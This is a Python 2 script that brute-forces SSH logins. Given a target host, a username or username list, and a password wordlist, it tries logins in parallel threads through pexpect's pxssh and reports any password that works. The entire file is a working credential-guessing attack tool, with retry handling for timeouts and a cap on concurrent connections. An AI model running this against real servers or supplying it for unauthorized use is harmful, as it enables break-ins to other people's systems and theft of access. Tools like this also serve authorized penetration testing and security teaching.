# -*- coding: utf-8 -*-
from pexpect import pxssh
import argparse
import time
import threading


threads = []
maxConnections = 5
lock = threading.Lock()
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        Found =True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronsize with original prompt ' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            # lock.release()
            connection_lock.release()

def use_passwd_file(args):
    password_list = []
    passwdFile = args.passwdFile
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        password = line.strip('\r').strip('\n')
        password_list.append(password)
    return password_list


def check_connection():
    if Found:
        print "[*] Exiting:Password and Username had Found"
        exit(0)
        if Fails > 5:
            print "[!] Exiting: Too many Socket Timeout"
            exit(0)


def use_parser():
    parser = argparse.ArgumentParser(usage='%(prog)s is a connection of ssh',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="""
The example:
1. %(prog)s -H x.x.x.x -u xxx -F xxx(filename)
2. %(prog)s -H x.x.x.x -U xxx(filename) -F xxx(filename)
----------------------------------------------------------""")
    parser.add_argument('-H', dest='tgthost', type=str, help='specify the target host')
    parser.add_argument('-F', dest='passwdFile', type=str)
    parser.add_argument('-u', dest='user', type=str, help='specify the user')
    parser.add_argument('-U', dest='UserFile', type=str, help='The user in file')
    parser.set_defaults(func=use_passwd_file)
    args = parser.parse_args()
    return args

def main():
    args = use_parser()
    host = args.tgthost

    if args.UserFile is not None and args.user is None:
        with open(args.UserFile, 'r') as fn1:
            for line1 in fn1.readlines():
                check_connection()  # 调用检查，如果发现用户名和密码匹配则停止程序
                user = line1.strip('\r').strip('\n')
                print '\n' + '[---Testing Username is: {}---]'.format(str(user))
                for password in args.func(args):
                    # lock.acquire()
                    check_connection()
                    connection_lock.acquire()
                    print '[-] Testing password: ' + str(password)
                    t = threading.Thread(target=connect, args=(host, user, password, True))
                    t.start()
                time.sleep(2.5)  # 为了等待最后的结果显示出出来才开始下一个用户的测试
    elif args.UserFile is None and args.user is not None:
        for password in args.func(args):
            check_connection()
            connection_lock.acquire()
            print '[-] Testing password: ' + str(password)
            t = threading.Thread(target=connect, args=(host, args.user, password, True))
            t.start()


if __name__ == '__main__':
    main()
